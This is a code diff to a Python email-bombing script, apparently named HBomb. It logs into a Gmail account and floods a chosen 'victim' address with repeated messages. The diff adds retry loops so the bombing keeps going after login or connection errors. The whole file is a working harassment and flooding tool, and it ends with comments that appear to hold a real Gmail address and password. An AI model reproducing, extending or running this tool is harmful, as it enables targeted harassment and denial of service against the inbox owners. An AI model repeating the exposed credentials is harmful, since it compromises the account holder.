@@ -42,9 +42,9 @@ def banner():
  ░  ░  ░ ░          ░ ░         ░    ░      
               ░                           ░
                ""","""
-----------------   --------------------
+----------------   ----------------------
 | KLS  Project |   | Version : """,verl,""" |
-----------------   --------------------
+----------------   ----------------------
 \tCreated by Honey Pots...
 -------------------------------------------- 
 """
@@ -59,7 +59,7 @@ def mail():
         SG = input("\aInvalid!!! Mail Please Enter your mail Again  : ")
     while int(len(SG)) < 10 : 
         SG= input("\aInvalid!!! Mail Please Enter your mail Again  : ")
-    Er = input("\n\nPlease check your \"Less secure app access turn : ON\" \n\n\tOtherwise it give you error \n\nVisit : https://myaccount.google.com/lesssecureapps : ")
+    Er = input("\n\nPlease check your \"Less secure app access turn off\" \n\n\tOtherwise it give you error \n\nVisit : https://myaccount.google.com/lesssecureapps : ")
     pws = input("\nEnter your gmail password : ")
     RG = str(input("Enter Victim Mail address : "))
     num = input("Enter Number of Mail : ")
@@ -71,29 +71,85 @@ def mail():
 
     mail = int(num) + 1
     print("\n\t\t Please Wait Bombing Start...")
-    connection = smtplib.SMTP('smtp.gmail.com', 587)
-    connection.ehlo()
-    connection.starttls()
-    connection.login(SG , pws)
-    for a in range(1, int(mail)) :
-        connection.sendmail(SG, RG, "Subject:shopping \n\n .... ")
+    while True:
+        try:
+            connection = smtplib.SMTP('smtp.gmail.com', 587)
+            connection.ehlo()
+            connection.starttls()
+            connection.login(SG , pws)
+            break
+        except smtplib.SMTPAuthenticationError :
+            print("Your Username/password not correct please Enter Again ")
+            SG0 = input("Enter your gmail address : " )
+            SG = SG0.strip()
+            while "@gmail.com" != SG[-10:] :
+                SG = input("\aInvalid!!! Mail Please Enter your mail Again  : ")
+            while int(len(SG)) < 10 : 
+                SG= input("\aInvalid!!! Mail Please Enter your mail Again  : ")
+            pws = input("\nEnter your gmail password : ")
+            print("\n\t\t Please Wait Bombing Start...")
+            continue
+        except smtplib.SMTPServerDisconnected :
+            print("Server Disconnected !!! Please check your Internet")
+            SG0 = input("Enter your gmail address : " )
+            SG = SG0.strip()
+            while "@gmail.com" != SG[-10:] :
+                SG = input("\aInvalid!!! Mail Please Enter your mail Again  : ")
+            while int(len(SG)) < 10 : 
+                SG= input("\aInvalid!!! Mail Please Enter your mail Again  : ")
+            pws = input("\nEnter your gmail password : ")
+            print("\n\t\t Please Wait Bombing Start...")
+            continue
+        except :
+            print("Unexpected Error !!! Please Try Again")
+            SG0 = input("\n Please Enter Again your gmail address : " )
+            SG = SG0.strip()
+            while "@gmail.com" != SG[-10:] :
+                SG = input("\aInvalid!!! Mail Please Enter your mail Again  : ")
+            while int(len(SG)) < 10 : 
+                SG= input("\aInvalid!!! Mail Please Enter your mail Again  : ")
+            pws = input("\nPlease Enter Again Enter your gmail password : ")
+            print("\n\t\t Please Wait Bombing Start...")
+            continue            
+        pass
 
-        clr()
-        banner()
-        print(Blue)
-        print("-------------------------------------------- ")
-        print(Red +"                  Details "+Blue)
-        print(" Target Mail             : ",RG)
-        print(" Number of Requests Sent : ",num)
-        print(" Successful Requests     : ",a)
-        print(" Failed Requests         : ",0)
-        print("-------------------------------------------- ")
-        print("            Bombing In Progress")
-    clr()
-    banner() 
-    print(str(num) + " Mail Send Successful To  " + str(RG))
-    input("\n\nPress Enter To Run Again HBomb Tool : ")  
-    subprocess.call([sys.executable, 'HBomb.py'])      
+
+    while True:
+        try:
+          for a in range(1, int(mail)) :
+            connection.sendmail(SG, RG, "Subject:shopping \n\n .... ")
+            clr()
+            banner()
+            print(Blue)
+            print("-------------------------------------------- ")
+            print(Red +"                  Details "+Blue)
+            print(" Target Mail             : ",RG)
+            print(" Number of Requests Sent : ",num)
+            print(" Successful Requests     : ",int(a))
+            print(" Failed Requests         : ",0)
+            print("-------------------------------------------- ")
+            print("            Bombing In Progress")
+          clr()
+          banner() 
+          print(str(num) + " Mail Send Successful To  " + str(RG))
+          input("\n\nPress Enter To Run Again HBomb Tool : ")  
+          subprocess.call([sys.executable, 'HBomb.py']) 
+
+        except smtplib.SMTPServerDisconnected :
+            print("Unexpected Error !!! Please Try Again")
+            RG = str(input("Enter Victim Mail address : "))
+            print("\n\t\t Please Wait Bombing Start...")
+            continue 
+        except :
+            print("Victim mail not correct !!!")
+            RG = str(input("Enter Victim Mail address : "))
+            print("\n\t\t Please Wait Bombing Start...")
+            continue         
+        pass
+    
 banner()
 
 mail()
+
+# honeypots24@gmail.com
+# sudhanhu24#@
